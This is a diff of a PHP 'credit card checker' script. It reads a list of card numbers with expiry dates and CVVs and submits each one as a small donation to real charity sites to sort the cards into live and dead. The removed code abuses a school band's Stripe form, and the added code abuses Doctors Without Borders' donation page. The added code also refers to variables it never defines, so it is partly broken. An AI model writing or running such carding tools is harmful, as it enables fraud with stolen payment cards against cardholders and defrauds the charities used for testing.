@@ -1,18 +1,19 @@
- <?php
-  echo "List Creditcard  : ";
-$xyz = trim(fgets(STDIN));
+<?php
 $no = 1;
-$jml = count(explode("\n", str_replace("\r", "", file_get_contents($xyz))));
-console::log("Total Creditcard : $jml", 'white');
+error_reporting(0);
+echo "List CC : ";
+$xyz = trim(fgets(STDIN));
 echo "\n";
 foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
-  $pecah = explode("|", trim($akun));
-  $card = trim($pecah[0]);
-  $month = trim($pecah[1]);
-  $year = trim($pecah[2]);
-  $cvc = trim($pecah[3]);
+    $pecah = explode("|", trim($akun));
+    $card = trim($pecah[0]);
+    $month = trim($pecah[1]);
+    $year = trim($pecah[2]);
+    $cvv = trim($pecah[3]);
+$headers = array();
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
 
-  $no = 1;
   $rest = substr("'.$card.'", 2, -12);
   $bin = curl('https://binlist.io/lookup/'.$rest.'/', null, null);
   $json = json_decode($bin[1], true);
@@ -21,69 +22,21 @@ foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key =
   $scheme = $json['scheme'];
   $cate = $json['category'];
   $country = $json['bank']['name'];
-
-  $pktoken = curl('https://www.milfordbands.org/support-us/donations/', null, null);
-  $token = get_between($pktoken[1], '{"p_key":"', '"');
-  // echo "token : $token\n";
-
-  $headers = array();
-  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
-  $headers[] = 'Accept: application/json';
-  $headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
-
-  $gas = curl('https://api.stripe.com/v1/payment_methods', 'type=card&billing_details[email]=pulswer%40gmail.com&billing_details[address][postal_code]=97220&card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&pasted_fields=exp%2Cnumber%2Czip&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4805489&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'', $headers);
-  $json = json_decode($gas[1], true);
-  $token2 = $json['id'];
-// print_r($gas);
-
-
-  $tok = curl('https://api.stripe.com/v1/tokens', 'card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[address_zip]=97220&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4728495&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'&pasted_fields=exp%2Cnumber%2Czip', $headers);
-  $json = json_decode($tok[1], true);
-  $idtoken = $json['id'];
-
-  $headers1 = array();
-  $headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
-  $headers1[] = 'Accept: */*';
-  $headers1[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
-  $headers1[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
-  $headers1[] = 'Origin: https://www.milfordbands.org';
-  $headers1[] = 'Connection: close';
-  $headers1[] = 'Referer: https://www.milfordbands.org/support-us/donations/';
-  $headers1[] = 'Cookie: __stripe_mid=a9e232b1-7967-4f6a-beea-55fb586432df; __stripe_sid=ed898f95-480d-4afb-874b-2ecae2317646';
-
-  $pktoken = curl('https://www.milfordbands.org/wp-admin/admin-ajax.php', 'action=ds_process_button&stripeToken='.$idtoken.'&paymentMethodID='.$token2.'&allData%5BbillingDetails%5D%5Bemail%5D=pulswer%40gmail.com&type=donation&amount=5&params%5Bname%5D=Milford+Bands&params%5Bamount%5D=&params%5Boriginal_amount%5D=5&params%5Bdescription%5D=Milford+Bands+Donation+Page&params%5Bpanellabel%5D=Donate+to+Us!&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=true&params%5Bcapture%5D=true&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=&params%5Bcustom_role%5D=&params%5Bbilling%5D=false&params%5Bshipping%5D=false&params%5Brememberme%5D=false&params%5Bkey%5D='.$token.'&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.milfordbands.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fmilfordbands.org%2Fwp-content%2Fuploads%2F2018%2F12%2FMilfordBandFB-1-2.jpg&params%5Bgeneral_currency%5D=USD&params%5Bgeneral_billing%5D=&params%5Bgeneral_shipping%5D=&params%5Bgeneral_rememberme%5D=&params%5Binstance%5D=ds5eab4b33d035e&params%5Bds_nonce%5D=7d485c3e5a&ds_nonce=7d485c3e5a', $headers1);
-   if (strpos($pktoken[1], 'On behalf of the Milford Band Boosters and our students, thank you so much for your generous contribution to our band and extracurricular band booster programs at Milford Exempted Village School District.')) {
-    console::log("[Total $no/$jml ] [Live] | $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country", 'green');
-    fwrite(fopen("card-live.txt", "a"), "[Live] | $card|$month|$year|$cvc \n");
-  } if (strpos($pktoken[1], 'Your card was declined.')) {
-    console::log("[Total $no/$jml] [Die] | $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country", 'red');
-  }
-  $no++;
+$lastCC = substr($cc_number, -4);
+                $typeCC = (substr($cc_number,0,1) == 4 ? "2" : (substr($cc_number,0,1) == 5 ? "1" : (substr($cc_number,0,1) == 6 ? "4" : (substr($cc_number,0,1) == 3 ? "3" : null ))));
+$gas = curl('https://donate.doctorswithoutborders.org/onetime.cfm', 'submitted=1&apple_pay_token=&apple_pay_paymentMethod=&apple_pay_billingContact=&apple_pay_shippingContact=&apple_pay_form_name=%2Fonetime.cfm&client_side_uuid=0B3A0FAA-D1C6-BB16-E15F8C3BECB09C6B&refer_type=&optimize_owls=&optimizelyhidden=&gift_type=onetime&gift_amount=other&other_gift_amount=5&card_type='.$typeCC.'&credit_card_number='.$card.'&cvv='.$cvv.'&card_expiration_month='.$month.'&card_expiration_year='.$year.'&echeck_account_type=&echeck_routing_number=&echeck_account_number=&acknowledgment_type=H&honoree_first_name=&honoree_last_name=&honoree_first_name_2=&honoree_last_name_2=&ecard=ecard&ecardID=20&recipient_title=&recipient_first_name=&recipient_last_name=&recipient_email=&ecard_send_date=05%2F20%2F2020&send_copy=1&sender_name=&sender_email=&personal_message=&from_company=0&company_name=&title=Mr.&first_name=apri&last_name=amsyah&address_1=37+Ginna+B.+Drive&address_apt=jakarta&city=jakarta&state=55&zip=97220&country=1&email=dowerarts%40gmail.com&enews=&phone=%28125%29+421-3123', $headers);
+$name = get_between($gas[1], "<li>", "</li>");
+    if (strpos($gas[1], 'There was an error processing your card')) {
+        echo "[$no] DIE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
+    } else if (strpos($gas[1], 'Please enter a future expiration date within next 10 years')) {
+        echo "[$no] Expired | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
+    } else if (strpos($gas[1], 'Please enter a valid credit card number')) {
+        echo "[$no] Card Not Valid | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
+    } else {
+        echo "[$no] LIVE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
+        fwrite(fopen("cc-live.txt", "a"), "$email | $passwd | Plan : $planname | Last Expire : $lastexpire\n");
 }
-
-
-    function curl($url,$post,$headers)
-{
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $url);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_HEADER, 1);
-  if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-  if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-  $result = curl_exec($ch);
-  $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-  $body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
-  $cookies = array();
-  foreach($matches[1] as $item) {
-    parse_str($item, $cookie);
-    $cookies = array_merge($cookies, $cookie);
-  }
-  return array (
-  $header,
-  $body,
-  $cookies
-  );
+    $no++;
 }
 
 function get_between($string, $start, $end) 
@@ -96,7 +49,45 @@ function get_between($string, $start, $end)
         return substr($string,$ini,$len);
     }
 
-    class Console {
+function curl($url,$post,$headers)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	$result = curl_exec($ch);
+	// $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+	$cookies = array();
+	foreach($matches[1] as $item) {
+	  parse_str($item, $cookie);
+	  $cookies = array_merge($cookies, $cookie);
+	}
+	return array (
+	$headers,
+	$body,
+	$cookies
+	);
+}
+
+function nama()
+	{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	$ex = curl_exec($ch);
+	// $rand = json_decode($rnd_get, true);
+	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
+	return $name[2][mt_rand(0, 14) ];
+	}
+
+	class Console {
  
     static $foreground_colors = array(
         'bold'         => '1',    'dim'          => '2',
@@ -204,4 +195,4 @@ function get_between($string, $start, $end)
         echo str_repeat("\007", $count);
     }
  
-} 
+}	
